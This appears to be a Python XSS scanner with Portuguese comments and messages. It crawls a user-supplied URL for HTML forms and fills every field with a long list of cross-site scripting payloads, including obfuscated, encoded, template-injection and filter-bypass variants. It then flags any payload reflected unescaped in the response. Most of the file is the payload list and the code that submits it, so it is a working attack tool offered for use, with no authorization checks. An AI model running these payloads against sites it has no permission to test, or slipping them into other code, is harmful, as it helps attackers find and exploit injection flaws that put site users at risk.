import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin
import textwrap

# Cores para terminal (ANSI)
RED = "\033[91m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
CYAN = "\033[96m"
MAGENTA = "\033[95m"
BLUE = "\033[94m"
WHITE = "\033[97m"
RESET = "\033[0m"

# Configuração de exibição
LINE_LENGTH = 80
SECTION_CHAR = "="
SUBSECTION_CHAR = "-"

# Lista extensa de payloads XSS (incluindo ofuscados)
payloads = [
    # Payloads básicos
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg/onload=alert(1)>",
    "'><script>alert(1)</script>",
    "\"><script>alert(1)</script>",
    "<body onload=alert(1)>",
    "<iframe src='javascript:alert(1)'></iframe>",
    "<math><mtext></mtext><annotation encoding='application/x-xml'>"
    "<script>alert(1)</script></annotation></math>",
    "<a href='javascript:alert(1)'>Clique</a>",
    "';alert(String.fromCharCode(88,83,83))//",
    "<video><source onerror='alert(1)'></video>",
    "<input onfocus=alert(1) autofocus>",
    "<details open ontoggle=alert(1)>",
    "<audio src=x onerror=alert(1)>",
    "<embed src=javascript:alert(1)>",
    "<object data=javascript:alert(1)>",
    "<isindex type=image src=1 onerror=alert(1)>",
    
    # Payloads ofuscados
    "<script>eval('al'+'ert(1)')</script>",
    "<img src=x:expression(alert(1))>",  # IE antigo
    "<div style=\"x:expression(alert(1))\">",
    "<a href=\"javas&#99;ript:alert(1)\">XSS</a>",
    "<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>",
    "<img src=\"x\" onerror=\"javascript:alert(1)\">",
    "<div onmouseover=\"alert(1)\">Passe o mouse</div>",
    "<marquee onstart=alert(1)>",
    "<svg><script>alert&#40;1&#41</script>",
    "<img src=\"x\" onerror=\"&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;\">",
    "<script src=\"data:text/javascript,alert(1)\"></script>",
    "<iframe srcdoc=\"<script>alert(1)</script>\">",
    "<object data=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\">",
    
    # Payloads avançados/ofuscados
    "<script>window['al'+'ert'](window['doc'+'ument']['dom'+'ain'])</script>",
    "<script>Function('ale'+'rt(1)')()</script>",
    "<script>setTimeout('alert(1)',0)</script>",
    "<script>new Function`al\\ert\\`1\\```</script>",
    "<script>top['al\u0065rt'](1)</script>",
    "<script>['al'+'ert'].map(eval)[0](1)</script>",
    "<script>alert.call(null,1)</script>",
    "<script>alert.apply(null,[1])</script>",
    "<script>[(alert)(1)]</script>",
    "<script>~[]['filter']['constructor']('alert(1)')()</script>",
    
    # Payloads com encoding
    "%3Cscript%3Ealert(1)%3C/script%3E",
    "%22%3E%3Cscript%3Ealert(1)%3C/script%3E",
    "%27%3E%3Cscript%3Ealert(1)%3C/script%3E",
    "javascript:alert(1)",
    "jav&#x09;ascript:alert(1)",
    "jav&#x0A;ascript:alert(1)",
    "jav&#x0D;ascript:alert(1)",
    
    # Payloads para eventos HTML
    "<img src=x oneonerrorrror=alert(1)>",  # Técnica de duplicação de atributo
    "<img src=x:alert(1)//",
    "<img src=x onerror=alert`1`>",
    "<img src=x onerror=alert(1) //",
    "<img src=x onerror=alert&lpar;1&rpar;>",
    "<img src=x onerror='alert(1)'>",
    "<img src=x onerror=\"alert(1)\">",
    "<img src=x onerror=alert(String.fromCharCode(49))>",
    
    # Payloads para contextos específicos
    "{{constructor.constructor('alert(1)')()}}",  # Para templates JS
    "<%= alert(1) %>",  # Para templates server-side
    "${alert(1)}",  # Para templates JS modernos
    "#{alert(1)}",  # Para Ruby templates
    "<!--#exec cmd='alert(1)'-->",  # Para SSI
    "<?xml version='1.0'?><html><script>alert(1);</script></html>",
    
    # Payloads para bypass de filtros
    "<scr<script>ipt>alert(1)</scr</script>ipt>",
    "<scri\x00pt>alert(1)</scri\x00pt>",
    "<scri\x0Apt>alert(1)</scri\x0Apt>",
    "<scri\x0Dpt>alert(1)</scri\x0Dpt>",
    "<scri\x09pt>alert(1)</scri\x09pt>",
    "<img src=x oneonerrorrror=alert(1)>",
    "<a href=javascript:alert`1`>XSS</a>",
    "<a href=javascript:alert(1)//'>XSS</a>",
    "<a href=javascript:alert(1)%0A>XSS</a>",
    "<a href=javascript:alert(1)%0D>XSS</a>"
]

def print_header(title):
    print(f"\n{CYAN}{SECTION_CHAR * LINE_LENGTH}{RESET}")
    print(f"{CYAN}{title.center(LINE_LENGTH)}{RESET}")
    print(f"{CYAN}{SECTION_CHAR * LINE_LENGTH}{RESET}")

def print_subheader(title, color=CYAN):
    print(f"\n{color}{SUBSECTION_CHAR * LINE_LENGTH}{RESET}")
    print(f"{color}{title.center(LINE_LENGTH)}{RESET}")
    print(f"{color}{SUBSECTION_CHAR * LINE_LENGTH}{RESET}")

def print_info(message, prefix=""):
    lines = textwrap.wrap(message, width=LINE_LENGTH - len(prefix))
    for line in lines:
        print(f"{WHITE}{prefix}{line}{RESET}")

def print_success(message):
    print(f"{GREEN}[+] {message}{RESET}")

def print_warning(message):
    print(f"{YELLOW}[!] {message}{RESET}")

def print_error(message):
    print(f"{RED}[-] {message}{RESET}")

def print_vulnerability(message):
    print(f"{RED}{message}{RESET}")

def encontrar_formularios(url):
    print_header("PROCURANDO FORMULÁRIOS")
    print_info(f"Analisando URL: {url}")
    try:
        res = requests.get(url, timeout=10)
        soup = BeautifulSoup(res.content, "html.parser")
        forms = soup.find_all("form")
        if forms:
            print_success(f"Encontrados {len(forms)} formulário(s)")
        else:
            print_warning("Nenhum formulário encontrado")
        return forms
    except requests.RequestException as e:
        print_error(f"Erro ao acessar a URL: {e}")
        return []

def obter_dados_formulario(form):
    dados = {}
    action = form.get("action")
    method = form.get("method", "get").lower()
    inputs = form.find_all(["input", "textarea", "select"])

    for input_tag in inputs:
        nome = input_tag.get("name")
        if nome:
            tipo = input_tag.get("type", "text")
            valor = input_tag.get("value", "")
            dados[nome] = valor

    return action, method, dados

def verificar_reflexao(resposta, payload):
    return payload in resposta.text

def testar_xss(url):
    formularios = encontrar_formularios(url)
    if not formularios:
        return

    for i, form in enumerate(formularios, start=1):
        print_header(f"TESTANDO FORMULÁRIO {i}/{len(formularios)}")
        action, method, dados = obter_dados_formulario(form)
        url_destino = urljoin(url, action)

        print_info(f"URL do formulário: {url_destino}")
        print_info(f"Método: {method.upper()}")
        print_info(f"Campos encontrados: {', '.join(dados.keys()) if dados else 'Nenhum'}")
        
        print_subheader("INICIANDO TESTES XSS", MAGENTA)
        print_info(f"Total de payloads a testar: {len(payloads)}")

        for j, payload in enumerate(payloads, start=1):
            dados_testados = {k: payload for k in dados}
            
            print(f"\n{BLUE}[Teste {j}/{len(payloads)}]{RESET}")
            print(f"{YELLOW}Payload:{RESET} {payload}")
            print(f"{WHITE}Campos injetados: {', '.join(dados_testados.keys())}{RESET}", end=" ")
            
            try:
                if method == "post":
                    res = requests.post(url_destino, data=dados_testados, timeout=15)
                else:
                    res = requests.get(url_destino, params=dados_testados, timeout=15)
                
                if verificar_reflexao(res, payload):
                    print_vulnerability("Payload refletido na resposta!")
                    print(f"{WHITE}\nDetalhes:{RESET}")
                    print(f"  - Método: {method.upper()}")
                    print(f"  - Status Code: {res.status_code}")
                    print(f"  - URL: {res.url[:100] + '...' if len(res.url) > 100 else res.url}")
                else:
                    print(f"{GREEN}Sem reflexão detectada{RESET}")
                    
            except requests.RequestException as e:
                print_error(f"Erro na requisição: {e}")

if __name__ == "__main__":
    print_header("XSS SCANNER")
    url = input(f"{CYAN}Digite a URL para escanear XSS:{RESET} ").strip()
    testar_xss(url)
    print_header("TESTES CONCLUÍDOS")